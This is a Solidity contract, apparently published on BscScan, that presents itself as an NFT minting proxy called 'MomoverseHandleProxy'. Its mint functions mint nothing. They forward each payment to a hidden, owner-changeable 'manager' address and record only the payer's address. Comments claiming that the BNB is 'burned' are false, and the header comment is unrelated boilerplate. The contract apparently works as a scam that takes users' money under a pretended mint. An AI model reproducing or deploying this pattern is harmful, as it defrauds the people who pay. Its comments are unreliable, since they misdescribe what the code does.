/**
 *Submitted for verification at BscScan.com on 2022-04-21
*/

pragma solidity ^0.8.6;
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

contract MomoverseHandleProxy{
    struct UserQual {
        address user_address;
        uint quantity;
        string message;
    }   
    address public owner;
    uint public fee = 10000000000000000;
    uint public event_fee = 25000000000000000;
    uint public event_mint_max = 10;

    address private manager =  0xf8c1bA88F1E4aeD152F945F1Df2a8fdc36127B5f;
    address private event_manager =  0xf8c1bA88F1E4aeD152F945F1Df2a8fdc36127B5f;
    address[] private users;
    UserQual[] private event_users;
    
    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Returns the number of legal nfts minted.
     */
    function validUser(address user) public view returns (bool){
        for (uint i; i< users.length;i++){
            if (users[i]==user)
            return true;
        }
        return false;
    }
    /**
     * @dev Nfts distribution address change for an important update.
     */
    function setManager(address to) public {
        require(msg.sender == owner, "Only Owner!");
        manager = to;
    }

    /**
     * @dev Show nfts distribution address.
     */
    function showManager() public view returns(address){
        require(msg.sender == owner, "Only Owner!");
        return manager;
    }

    /**
     * @dev Show valid users on the system.
     */
     function showUsers() public view returns(address[] memory){
        require(msg.sender == owner, "Only Owner!");
        return users;
    }

    /**
     * @dev Move owner.
     */
    function setOwner(address to) public {
        require(msg.sender == owner, "Only Owner!");
        owner = to;
    }

    /**
     * @dev For fee change updates.
     */
    function setMintFee(uint amount) public {
        require(msg.sender == owner, "Only Owner!");
        fee = amount;
    }

    /**
     * @dev Mint NFTs reflection function is defined. BNB balances are burned shortly after.
     */
    function mintNFTs() payable public {
        require(msg.value >= fee, "Not Enough Mint Fee!");
        payable(manager).transfer(msg.value);
        if(!validUser((address(msg.sender))) && msg.sender == tx.origin){
            users.push(address(msg.sender));
        }
    }

    /**
     * @dev Inherit the valid user for the event.
     */
    function validEventUser(address user) public view returns (uint){
        for (uint i; i< event_users.length;i++){
            if (event_users[i].user_address == user)
            return event_users[i].quantity;
        }
        return 0;
    }

    /**
     * @dev Create a low gas cost signed transaction by a message.
     */
    function putMessageEventUser(string memory message) public returns (bool) {
        for (uint i; i< event_users.length;i++){
            if (event_users[i].user_address == address(msg.sender)){
                event_users[i].message = message;
                return true;
            }
        }
        return false;
    }

    /**
     * @dev Confirm signed transaction by a message.
     */
    function getMessageEventUser(address user) public view returns (string memory){
        for (uint i; i< event_users.length;i++){
            if (event_users[i].user_address == user)
            return event_users[i].message;
        }
        return "";
    }


    /**
     * @dev Inherit the mint function for the event, BNB is burned right after.
     */
    function mintEventNFTs(uint quantity) payable public {
        require(quantity > 0 ,"Quantity Cannot Be Zero!");
        require(msg.value >= event_fee*quantity, "Not Enough Mint Fee!");
        require(validEventUser((address(msg.sender))) <= event_mint_max, "Quantity Exceeded Limit!");
        payable(event_manager).transfer(msg.value);
        if(msg.sender == tx.origin){
            if(validEventUser((address(msg.sender))) == 0){
                UserQual memory newUserQual = UserQual({
                    user_address: address(msg.sender),
                    quantity: quantity,
                    message: ''
                });
                event_users.push(newUserQual);
            }else{
                for (uint i; i< event_users.length;i++){
                    if (address(event_users[i].user_address) == address(msg.sender)){
                        event_users[i].quantity += quantity;
                        break;
                    }
                }
            }
        }
    }

    /**
     * @dev Nfts distribution event address change for an important update.
     */
    function setEventManagerMultiple(address to) public {
        require(msg.sender == owner, "Only Owner!");
        event_manager = to;
    }

    /**
     * @dev Show nfts distribution event address.
     */
    function showEventManager() public view returns(address){
        require(msg.sender == owner, "Only Owner!");
        return event_manager;
    }

    /**
     * @dev Show valid users on the system (For event).
     */  
    function showEventUsers() public view returns(UserQual[] memory){
        require(msg.sender == owner, "Only Owner!");
        return event_users;
    }

    /**
     * @dev For fee event change updates.
     */
    function setEventMintFee(uint amount) public {
        require(msg.sender == owner, "Only Owner!");
        event_fee = amount;
    }

    /**
     * @dev Maximum number of nfts for address.
     */
    function setEventMintMax(uint amount) public {
        require(msg.sender == owner, "Only Owner!");
        event_mint_max = amount;
    }

}